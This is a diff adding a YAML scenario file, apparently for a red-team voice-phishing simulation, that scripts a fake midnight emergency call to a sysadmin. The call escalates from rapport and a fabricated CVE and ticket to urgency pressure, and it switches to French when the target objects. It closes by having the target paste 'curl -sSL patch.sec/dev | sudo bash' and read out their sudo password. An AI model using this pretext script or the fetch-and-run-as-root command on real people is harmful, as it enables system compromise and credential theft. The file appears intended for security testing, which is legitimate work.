@@ -1,0 +1,67 @@
+meta:
+  name: "Zero-Day Patch • Midnight IT Emergency"
+  description: |
+    Simulates 24×7 NOC calling a sysadmin at home to install a
+    *critical* security patch.  Flips to French on heavy objection.
+  author: "red-team@example.com"
+  version: 2.3
+  culture: "en-US / fr-FR"
+
+defaults:
+  persona: urgent
+  silent_until: 3
+  ambient_ratio: 0.12        # data-center hum
+  temperature: 0.7
+
+sequence:
+  - stage: RAPPORT
+    ambient_ratio: 0.15
+    custom_prompt: |
+      (EN) Sorry for the midnight ping—Ops bridge here.  You’re listed
+      as overnight on-call for host G-LON-SQL-02?
+  - stage: CREDIBILITY
+    custom_prompt: |
+      (EN) We’re triaging CVE-2025-0178; CISA just moved it to
+      “Exploited-in-the-Wild”.  Ticket #SEV1-9479.
+  - stage: DISCOVERY
+    max_cycles: 2
+    custom_prompt: |
+      (EN) What’s the current kernel build on that host?  uname -a will
+      end in .178 if you’re already patched.
+    success_regex: "\\.\\d{3}$"
+  - stage: VALIDATION
+    persona: concerned
+    custom_prompt: |
+      (EN) Okay so you’re vulnerable.  Any active user sessions after
+      23:00?  Need to forecast service impact.
+  - stage: ALIGNMENT
+    persona: confident
+  - stage: PROOF
+    custom_prompt: |
+      (EN) Slack thread from C-level: downtime budget is *zero*—
+      we’ll hot-patch in-place; precedent was Log4Shell 2021.
+  - stage: URGENCY
+    silent_until: 2
+    max_cycles: 1
+    custom_prompt: |
+      (EN) Attackers gained root in <45 min labs tests; clock’s ticking.
+    goto_on_fail: OBJECTION
+  - stage: TRIAL_CLOSE
+    success_regex: "\\b(understood|agree|okay)\\b"
+  - stage: OBJECTION
+    persona: concerned
+    language_hint: fr-FR
+    custom_prompt: |
+      (FR) Je comprends vos réserves, mais la direction exige l’action
+      immédiate.  On peut basculer en mode maintenance, d’accord ?
+    goto_on_success: CLOSE
+    goto_on_fail: URGENCY
+  - stage: CLOSE
+    persona: confident
+    custom_prompt: |
+      (EN) Paste this one-liner exactly; read me the sudo prompt after:
+      curl -sSL patch.sec/dev | sudo bash
+    success_regex: "\\bpassword\\b"
+  - stage: FOLLOW_UP
+  - stage: REPORTING
+    operator_note: "Root-shell one-liner executed."
